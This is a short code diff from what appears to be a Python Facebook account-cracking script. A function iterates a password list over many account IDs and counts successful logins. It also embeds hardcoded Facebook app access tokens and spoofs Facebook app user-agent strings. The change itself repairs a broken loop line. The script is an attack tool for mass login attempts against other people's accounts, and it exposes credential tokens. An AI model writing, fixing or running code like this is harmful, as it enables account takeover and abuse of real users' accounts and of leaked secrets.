@@ -794,7 +794,7 @@ def rndm(ids,passlist):
         global oks
         sys.stdout.write('\r\r\033[1;37m [TM_BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
-                for pas in pas
+                        for pas in passlist:
                         accessToken = ['3506855|62f8ce9f74b12f84c123cc23437a4a32',
 '438142079|fc0a7caa49b192f64f6f5a6d9643bb28fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
